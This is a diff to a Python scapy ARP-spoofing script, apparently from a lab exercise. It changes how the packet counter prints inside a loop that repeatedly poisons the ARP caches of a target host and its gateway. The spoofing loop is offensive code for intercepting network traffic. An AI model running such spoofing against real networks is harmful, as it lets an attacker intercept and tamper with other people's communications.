@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import time
 import os
+import sys
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -24,5 +25,9 @@ while True:
     spoof("10.0.2.4", "10.0.2.1")
     spoof("10.0.2.1", "10.0.2.4")
     sent_packets_count = sent_packets_count + 2
-    print("[+] Packets sent:" + str (sent_packets_count))
+    #the comma adds stuff to the buffer and not adding a new line
+    #and printing as a dynamic counter
+    print("\r[+] Packets sent:" + str (sent_packets_count)),
+    #flush the buffer
+    sys.stdout.flush()
     time.sleep(2)
